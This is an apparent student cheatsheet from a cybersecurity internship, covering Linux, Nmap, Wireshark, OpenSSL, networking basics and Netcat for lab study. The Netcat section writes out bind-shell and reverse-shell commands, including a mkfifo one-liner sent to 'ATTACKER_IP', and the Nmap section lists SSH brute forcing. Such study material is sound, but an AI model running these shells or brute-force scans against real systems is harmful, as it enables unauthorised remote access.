# Task 1 — Quick Reference Cheatsheet
> ApexPlanet Internship | Cybersecurity & Ethical Hacking

---

## 🐧 Linux Quick Reference

```bash
# NAVIGATION
pwd | ls -la | cd ~ | cd .. | cd /path

# FILES
cp src dst | mv src dst | rm -rf dir | mkdir -p dir/sub
cat file | less file | head -20 file | tail -f file
grep "pattern" file | grep -r "pattern" /dir
nano file | vim file

# PERMISSIONS
chmod 755 file     # rwxr-xr-x
chmod 644 file     # rw-r--r--
chmod +x script    # add execute
chown user:grp file

# PROCESSES
ps aux | grep process
kill -9 PID
top / htop
jobs | fg | bg

# NETWORK
ip a               # show interfaces
ip r               # show routes
ping -c4 IP
netstat -tulpn     # open ports
ss -tulpn          # modern version
curl -I URL        # HTTP headers

# FILE SEARCH
find / -name "*.conf" 2>/dev/null
find / -perm -4000 2>/dev/null   # SUID files
locate filename
which tool         # find tool path

# PACKAGE MANAGEMENT
apt update && apt upgrade
apt install <pkg>
apt remove <pkg>
dpkg -l | grep <name>
```

---

## 🗺️ Nmap Cheatsheet

```bash
# DISCOVERY
nmap -sn 192.168.56.0/24          # Ping sweep
nmap -PR 192.168.56.0/24          # ARP scan (local)

# PORT SCANS
nmap 192.168.56.101                # Top 1000 ports
nmap -p- 192.168.56.101            # All 65535 ports
nmap -p 22,80,443 IP               # Specific ports
nmap -F IP                         # Fast scan (top 100)

# SCAN TYPES
nmap -sS IP    # SYN stealth (default, needs root)
nmap -sT IP    # TCP connect (no root needed)
nmap -sU IP    # UDP scan
nmap -sA IP    # ACK scan (firewall mapping)
nmap -sN IP    # NULL scan

# DETECTION
nmap -sV IP    # Service versions
nmap -O IP     # OS detection
nmap -A IP     # All: OS+version+scripts+traceroute

# SCRIPTS (NSE)
nmap -sC IP                       # Default scripts
nmap --script vuln IP             # Vulnerability scan
nmap --script http-title IP       # Web page titles
nmap --script ftp-anon IP         # FTP anonymous login
nmap --script ssh-brute IP        # SSH brute force

# OUTPUT
nmap -oN out.txt IP    # Normal text
nmap -oX out.xml IP    # XML
nmap -oA out IP        # All formats
nmap -v IP             # Verbose
nmap -d IP             # Debug
```

---

## 🦈 Wireshark Filters

```
# BY PROTOCOL
http | https | ftp | dns | ssh | tcp | udp | icmp | arp

# BY IP
ip.addr == 192.168.56.101
ip.src == 192.168.56.101
ip.dst == 192.168.56.101

# BY PORT
tcp.port == 80
tcp.port == 22
udp.port == 53

# BY FLAG
tcp.flags.syn == 1
tcp.flags.ack == 1
tcp.flags.rst == 1

# HTTP SPECIFIC
http.request.method == "POST"
http.request.method == "GET"
http contains "password"
http.response.code == 200

# COMBINE
ip.addr == 10.0.0.1 && tcp.port == 80
http || dns
!(arp || icmp)     # Exclude noise

# USEFUL ACTIONS
Right-click → Follow → TCP Stream    (read full conversation)
File → Export Objects → HTTP         (save downloaded files)
Statistics → Protocol Hierarchy      (traffic overview)
Statistics → Conversations           (who's talking to who)
```

---

## 🔐 OpenSSL Cheatsheet

```bash
# HASHING
echo -n "text" | openssl dgst -md5
echo -n "text" | openssl dgst -sha256
openssl dgst -sha256 file.txt

# SYMMETRIC ENCRYPTION
openssl enc -aes-256-cbc -salt -in plain.txt -out enc.bin
openssl enc -aes-256-cbc -d -in enc.bin -out dec.txt

# RSA KEY PAIR
openssl genrsa -out private.key 2048
openssl rsa -in private.key -pubout -out public.key
openssl rsa -in private.key -text -noout    # View key details

# ENCRYPT WITH PUBLIC KEY
openssl rsautl -encrypt -inkey public.key -pubin -in plain.txt -out enc.txt
openssl rsautl -decrypt -inkey private.key -in enc.txt -out dec.txt

# SELF-SIGNED CERTIFICATE
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

# INSPECT CERTIFICATE
openssl x509 -in cert.pem -text -noout
openssl s_client -connect google.com:443     # Check live SSL cert

# BASE64
echo "hello" | openssl base64              # Encode
echo "aGVsbG8K" | openssl base64 -d       # Decode
```

---

## 🌐 Networking Quick Reference

```
OSI LAYERS (Top → Bottom)
7 Application  → HTTP, DNS, FTP, SMTP
6 Presentation → SSL/TLS, encoding
5 Session      → Session management
4 Transport    → TCP (reliable), UDP (fast)
3 Network      → IP, routing
2 Data Link    → MAC addresses, Ethernet
1 Physical     → Cables, wireless

KEY PORTS
21  FTP          22  SSH          23  Telnet
25  SMTP         53  DNS          67  DHCP
80  HTTP         110 POP3         143 IMAP
443 HTTPS        445 SMB          3306 MySQL
3389 RDP         8080 HTTP-Alt    27017 MongoDB

SUBNETTING
/8  = 255.0.0.0       → ~16M hosts
/16 = 255.255.0.0     → ~65K hosts
/24 = 255.255.255.0   → 254 hosts
/25 = 255.255.255.128 → 126 hosts
/26 = 255.255.255.192 → 62 hosts
/30 = 255.255.255.252 → 2 hosts

PRIVATE IP RANGES
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
```

---

## 🐈 Netcat Cheatsheet

```bash
# LISTEN
nc -lvp 4444                      # Listen on port 4444
nc -lvp 4444 -e /bin/bash         # Bind shell

# CONNECT
nc 192.168.56.101 4444            # Connect to host:port
nc -zv 192.168.56.101 1-1000      # Port scan range

# BANNER GRABBING
nc 192.168.56.101 22              # Grab SSH banner
nc 192.168.56.101 80              # Send HTTP manually
  → GET / HTTP/1.0 [Enter][Enter]

# FILE TRANSFER
nc -lvp 4444 > file.txt           # Receiver
nc 192.168.56.101 4444 < file.txt # Sender

# REVERSE SHELL (target sends shell to attacker)
# Attacker listens:
nc -lvp 4444
# Target runs:
nc -e /bin/bash 192.168.56.100 4444
# If -e not available:
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
```

---

## 🧠 Key Terms

| Term | Meaning |
|------|---------|
| CVE | Public ID for a known vulnerability |
| CVSS | Score 0–10 for vulnerability severity |
| Zero-Day | Unpatched vulnerability |
| PoC | Proof of Concept exploit |
| Payload | Code that executes on the target |
| Shell | Command-line access to a system |
| Reverse Shell | Target connects back to attacker |
| Bind Shell | Attacker connects to target's open port |
| Pivoting | Using compromised host to attack deeper network |
| Persistence | Maintaining access after reboot |
| Lateral Movement | Moving across systems in a network |
| Privilege Escalation | Gaining higher access (user → root) |

---

*Cheatsheet by Manivel R | ApexPlanet Internship 2026 | github.com/manivel-cyber-ai*
